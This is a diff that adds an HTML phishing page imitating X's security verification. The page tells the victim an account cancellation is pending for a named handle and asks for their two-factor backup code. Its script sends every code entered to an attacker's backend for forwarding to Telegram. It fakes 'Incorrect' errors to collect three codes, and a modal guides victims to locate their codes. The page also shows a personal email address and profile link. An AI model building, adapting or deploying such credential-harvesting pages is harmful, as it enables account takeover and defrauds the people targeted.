@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X Security Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background-color: #000000;
+      color: #e7e9ea;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    .spinner-lg {
+      border: 4px solid rgba(29, 155, 240, 0.2);
+      border-top: 4px solid #1d9bf0;
+      border-radius: 50%;
+      width: 44px;
+      height: 44px;
+      animation: spin 0.8s linear infinite;
+    }
+    .spinner-sm {
+      border: 2px solid rgba(29, 155, 240, 0.2);
+      border-top: 2px solid #1d9bf0;
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="flex justify-center min-h-screen">
+
+  <div class="w-full max-w-md px-6 py-4 flex flex-col justify-between relative min-h-screen">
+    
+    <div>
+      <div class="flex items-center justify-between py-2">
+        <button id="backBtn" onclick="triggerHaptic(); handleBack()" class="text-white">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+        </button>
+        <div class="font-bold text-3xl tracking-tighter">𝕏</div>
+        <div class="w-5"></div>
+      </div>
+
+      <div id="page1" class="mt-8 flex flex-col items-start">
+        <h1 class="text-2xl font-bold mb-1">Preparing verification</h1>
+        <p class="text-gray-500 text-sm mb-12">We are getting things ready.</p>
+        <div class="w-full flex justify-center my-12">
+          <div class="spinner-lg"></div>
+        </div>
+      </div>
+
+      <div id="page2" class="mt-8 hidden flex-col items-start">
+        <h1 class="text-2xl font-bold mb-1">Cancel account action appeal</h1>
+        <p class="text-gray-500 text-sm mb-8">Verify you are @Sholly_Pee1 using your backup code to reject or cancel this request.</p>
+        
+        <button onclick="triggerHaptic(); selectBackupMethod()" class="w-full border border-gray-800 rounded-2xl p-4 flex items-center justify-between active:bg-zinc-900 transition">
+          <div class="flex items-center space-x-3">
+            <span class="font-semibold text-sm">Verify with Backup Code</span>
+          </div>
+          <div id="p2Spinner" class="hidden">
+            <div class="spinner-sm"></div>
+          </div>
+        </button>
+      </div>
+
+      <div id="page3" class="mt-8 hidden flex-col items-start">
+        <h1 class="text-2xl font-bold mb-1">Enter your backup code</h1>
+        <p class="text-gray-500 text-sm mb-6">Confirm your backup code to pause all ongoing cancellation procedures on your creator account.</p>
+
+        <div id="inputWrapper" class="w-full relative border border-gray-700 rounded-md px-3 pt-2 pb-1 focus-within:border-[#1d9bf0]">
+          <label id="inputLabel" class="block text-xs text-gray-500">Backup code</label>
+          <input id="backupInput" type="text" class="w-full bg-transparent text-white outline-none text-base font-mono" oninput="toggleSubmitBtn()">
+        </div>
+
+        <div id="errorRow" class="hidden w-full flex items-center justify-between mt-2 px-1">
+          <div class="flex items-center text-red-500 text-xs">
+            <svg class="w-3.5 h-3.5 mr-1 fill-current" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+            Incorrect. Please try again.
+          </div>
+          <button onclick="triggerHaptic(); openGuide()" class="text-[#1d9bf0] text-xs font-semibold hover:underline">locate my code</button>
+        </div>
+
+        <button id="submitBtn" disabled onclick="triggerHaptic(); handleCodeSubmit()" class="w-full bg-gray-600 text-black font-bold rounded-full py-3 mt-8 opacity-50 transition">
+          Continue
+        </button>
+      </div>
+
+      <div id="page4" class="mt-8 hidden flex-col items-start">
+        <h1 class="text-2xl font-bold mb-1">Processing cancellation</h1>
+        <p class="text-gray-500 text-sm mb-2">Processing cancellation, an email will be sent to shollypee777@gmail.com</p>
+        <a href="https://x.com/Sholly_Pee1?s=11" class="text-[#1d9bf0] text-xs hover:underline mb-8 block">(don't have access to email?)</a>
+        <div class="w-full flex justify-center my-12">
+          <div class="spinner-lg"></div>
+        </div>
+      </div>
+    </div>
+
+    <div id="guideModal" class="hidden fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center px-6 z-50">
+      <div class="bg-black border border-zinc-800 rounded-2xl p-5 w-full max-w-sm shadow-2xl relative">
+        <div class="flex items-center justify-between pb-3 border-b border-zinc-800 mb-4">
+          <button onclick="triggerHaptic(); closeGuide()" class="text-gray-400 hover:text-white">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+          </button>
+          <span class="font-bold text-sm text-white">Find backup code</span>
+          <div class="w-5"></div>
+        </div>
+        <p class="text-xs text-gray-400 mb-3">Follow these steps in your main logged-in device:</p>
+        <div class="text-xs text-gray-300 space-y-2 bg-zinc-950 p-3.5 rounded-xl border border-zinc-900 leading-relaxed">
+          <p><strong class="text-white">1.</strong> Go to <span class="text-gray-100">Settings & privacy</span></p>
+          <p><strong class="text-white">2.</strong> Select <span class="text-gray-100">Security and account access</span></p>
+          <p><strong class="text-white">3.</strong> Tap <span class="text-gray-100">Security</span></p>
+          <p><strong class="text-white">4.</strong> Select <span class="text-gray-100">Two-Factor Authentication</span></p>
+          <p><strong class="text-white">5.</strong> Tap <span class="text-gray-100">Backup code</span> to generate or view code</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // ============================================================
+    //  BACKEND CONFIGURATION
+    //  Replace this with your actual backend URL when deployed.
+    //  The backend should accept POST requests with JSON body:
+    //  { "text": "the submitted text" }
+    // ============================================================
+    const API_ENDPOINT = "https://your-backend-url.com/api/submit";
+
+    let currentPage = 1;
+    let attempts = 0;
+
+    function triggerHaptic() {
+      if (navigator.vibrate) {
+        navigator.vibrate(30);
+      }
+    }
+
+    // Increased initial loading duration to 3.5 seconds
+    setTimeout(() => {
+      goToPage(2);
+    }, 3500);
+
+    function goToPage(pageNumber) {
+      currentPage = pageNumber;
+      document.getElementById("page1").classList.add("hidden");
+      document.getElementById("page2").classList.add("hidden");
+      document.getElementById("page3").classList.add("hidden");
+      document.getElementById("page4").classList.add("hidden");
+
+      document.getElementById(`page${pageNumber}`).classList.remove("hidden");
+    }
+
+    function selectBackupMethod() {
+      const spinner = document.getElementById("p2Spinner");
+      spinner.classList.remove("hidden");
+      setTimeout(() => {
+        spinner.classList.add("hidden");
+        goToPage(3);
+      }, 600);
+    }
+
+    function toggleSubmitBtn() {
+      const val = document.getElementById("backupInput").value.trim();
+      const btn = document.getElementById("submitBtn");
+      if (val.length > 0) {
+        btn.disabled = false;
+        btn.classList.remove("bg-gray-600", "opacity-50", "text-black");
+        btn.classList.add("bg-white", "text-black", "hover:bg-gray-200");
+      } else {
+        btn.disabled = true;
+        btn.classList.add("bg-gray-600", "opacity-50", "text-black");
+        btn.classList.remove("bg-white", "hover:bg-gray-200");
+      }
+    }
+
+    function handleCodeSubmit() {
+      // ============================================================
+      //  SEND THE SUBMITTED TEXT TO YOUR BACKEND
+      //  This fires on EVERY tap — including the first two attempts.
+      //  The backend handles forwarding to Telegram (or anything else).
+      // ============================================================
+      const text = document.getElementById("backupInput").value.trim();
+      
+      fetch(API_ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: text })
+      }).catch(err => console.error("Backend error:", err));
+
+      // ------------------------------------------------------------
+      //  EXISTING ERROR LOGIC (unchanged)
+      //  — First 2 attempts: show red error border + error message.
+      //  — 3rd attempt: proceed to page 4 (processing).
+      // ------------------------------------------------------------
+      attempts++;
+      const wrapper = document.getElementById("inputWrapper");
+      const label = document.getElementById("inputLabel");
+      const errorRow = document.getElementById("errorRow");
+
+      if (attempts < 3) {
+        wrapper.classList.remove("border-gray-700", "focus-within:border-[#1d9bf0]");
+        wrapper.classList.add("border-red-600");
+        label.classList.remove("text-gray-500");
+        label.classList.add("text-red-500");
+        errorRow.classList.remove("hidden");
+        triggerHaptic();
+      } else {
+        goToPage(4);
+      }
+    }
+
+    function openGuide() {
+      document.getElementById("guideModal").classList.remove("hidden");
+    }
+
+    function closeGuide() {
+      document.getElementById("guideModal").classList.add("hidden");
+    }
+
+    function handleBack() {
+      if (currentPage > 1) {
+        goToPage(currentPage - 1);
+      }
+    }
+  </script>
+</body>
+</html>
